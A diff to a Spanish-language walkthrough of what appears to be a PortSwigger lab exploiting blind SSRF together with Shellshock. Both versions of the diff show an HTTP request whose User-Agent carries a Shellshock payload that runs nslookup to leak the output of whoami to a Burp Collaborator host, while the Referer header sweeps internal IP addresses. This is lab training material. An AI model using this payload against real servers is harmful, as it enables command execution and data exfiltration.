@@ -22,12 +22,13 @@ tags:
 
 ## Cómo explotarlo
 El server interno corre CGI vulnerable a **Shellshock**. Metés el payload en el **`User-Agent`** y escaneás el rango interno por el **`Referer`** con **Intruder** (sniper sobre el octeto):
-```http
-GET /product?productId=1 HTTP/1.1
-Host: LAB.web-security-academy.net
-User-Agent: () { :; }; /usr/bin/nslookup $(whoami).TU-SUBDOMINIO.oastify.com
-Referer: http://192.168.0.§1§:8080
-```
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/IP) + el **payload** del ataque (URL interna / Referer / User-Agent).
+
+<pre class="payload"><code>GET /product?productId=1 HTTP/1.1
+Host: <mark>LAB.web-security-academy.net</mark>
+User-Agent: <mark>() { :; }; /usr/bin/nslookup $(whoami).TU-SUBDOMINIO.oastify.com</mark>
+Referer: <mark>http://192.168.0.§1§:8080</mark></code></pre>
 Cuando el `Referer` pega en la IP correcta, el CGI ejecuta el `User-Agent` → `nslookup` filtra `$(whoami)` como **subdominio DNS**.
 
 ## Verificación
